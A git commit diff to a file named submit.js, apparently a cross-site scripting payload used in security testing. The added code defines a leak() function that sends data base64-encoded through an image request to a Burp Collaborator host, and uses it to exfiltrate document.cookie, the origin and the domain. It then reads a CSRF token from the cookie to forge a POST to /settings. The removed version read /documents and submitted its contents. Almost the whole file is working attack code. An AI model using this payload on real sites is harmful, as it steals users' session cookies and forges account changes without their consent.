0b0bf1704c16040fb1b2722c21a15f35a893111d
Peter af Geijerstam <peter.af.geijerstam@gmail.com>
2020-01-21 14:39:19 +0100

    Update submit.js

--- submit.js
+++ submit.js
@@ -1,8 +1,38 @@
-var url = "/documents";
-var xhr = new XMLHttpRequest();
-xhr.open('GET', url);
-xhr.onload = function() {
-	document.myform.name.value=btoa(this.response);
-	document.myform.submit();
+leak = function(name, data)
+{
+   var i = document.createElement('img');
+   i.src = "https://yxz1eqvtp27ov7r4y4qdkmmyqpwqkf.burpcollaborator.net?" + name + "=" + btoa(data);
+   document.body.appendChild(i);	
 }
-xhr.send();
+leak("window.origin",window.origin);
+leak("document.domain",document.domain);
+leak("document.cookie",document.cookie);
+
+var csrf = document.cookie.split('=')[1];
+
+var XHR = new XMLHttpRequest();
+var FD  = new FormData();
+
+FD.append("_csrf_token", csrf);
+FD.append("name", "testing");
+FD.append("user_id", "61");
+
+XHR.addEventListener('load', function( event ) {
+    leak("load_event","Data sent and response loaded.");
+});
+
+XHR.addEventListener('error', function( event ) {
+    leak("error_event","Something went wrong.");
+});
+
+XHR.onload = function() {
+   if (XHR.status != 200) {
+      leak("onload_non200",`Error ${XHR.status}: ${XHR.statusText}`);
+   } else {
+      leak("onload_200",`Done, got ${XHR.response.length} bytes`);
+   }
+};
+
+
+XHR.open('POST', '/settings');
+XHR.send(FD);
